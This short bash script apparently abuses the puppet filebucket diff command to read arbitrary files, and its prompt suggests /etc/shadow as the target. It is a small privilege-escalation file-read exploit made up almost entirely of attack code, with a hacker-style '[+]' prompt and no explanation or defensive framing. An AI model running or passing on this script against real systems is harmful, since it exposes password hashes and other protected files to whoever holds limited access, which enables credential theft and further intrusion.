#!/bin/bash
echo -n "[+] Enter file path(eg:- /etc/shadow): "
read filepath
puppet filebucket -l diff /dev/null $filepath
